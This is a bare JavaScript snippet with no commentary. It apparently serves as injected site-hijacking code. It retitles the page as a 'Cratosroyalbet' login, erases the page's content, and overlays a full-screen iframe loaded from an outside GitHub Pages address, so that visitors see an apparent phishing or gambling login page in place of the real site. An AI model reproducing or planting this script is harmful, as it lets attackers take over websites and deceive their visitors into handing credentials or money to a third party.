(function() {
    document.title = "Cratosroyalbet Giriş";
    var ifr = document.createElement('iframe');
    ifr.src = 'https://devworksg-ux.github.io/geldikkss3/index.html'; 
    ifr.setAttribute('style', 'position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999; background:#fff;' );
    
    var render = function() {
        if (document.body) {
            document.body.innerHTML = '';
            document.body.appendChild(ifr);
            document.documentElement.style.visibility = "visible";
            document.body.style.visibility = "visible";
        } else {
            setTimeout(render, 10);
        }
    };
    render();
})();
